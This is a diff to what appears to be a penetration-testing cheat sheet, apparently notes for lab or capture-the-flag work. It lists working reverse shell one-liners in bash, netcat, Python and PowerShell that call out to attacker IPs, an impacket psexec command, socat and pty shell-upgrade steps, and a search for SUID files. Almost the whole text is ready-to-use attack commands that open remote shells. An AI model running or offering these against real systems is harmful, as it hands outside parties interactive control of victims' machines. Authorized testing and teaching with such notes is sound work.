@@ -11,13 +11,18 @@ Reverse shell
 6. ` echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.77 4444' >> revshell `
 7. ` echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.77/4444 0>&1' >> revshell `
 8. ` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+9. ` $callback = New-Object System.Net.Sockets.TCPClient("10.10.14.47",4444);$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close(); `
+10. ` psexec.py 'user:password@RHOST' ` - Windows shell with `impacket`
 
 Upgrade shell
-1. `python3 -c 'import pty; pty.spawn("/bin/sh")' `
-2. ` stty raw -echo; fg `, then ` reset `
+1. `python3 -c 'import pty; pty.spawn("/bin/bash")' `
+2. ` stty raw -echo; fg `, then ` reset `, `screen`, ` export TERM=screen `
 3. ` stty erase ^h ` (if the backspace is not working)
 4. ` script /dev/null -c bash `
 5. ` socat file:tty,raw,echo=0 tcp-listen:5555 ` - start `socat` listener, ` socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.77:5555 ` on victim machine
+6. https://zweilosec.github.io/posts/upgrade-windows-shell/
+7. ` socat TCP4-LISTEN:$port,fork STDOUT ` on attacker machine, then `socat.exe TCP4:$ip:$port EXEC:'cmd.exe',pipes` on victim machine
+8. Run `nc` with `rlwrap` for Windows
 
 Linux find SUID files
 1. `find / -type f -perm -04000 -ls 2>/dev/null`
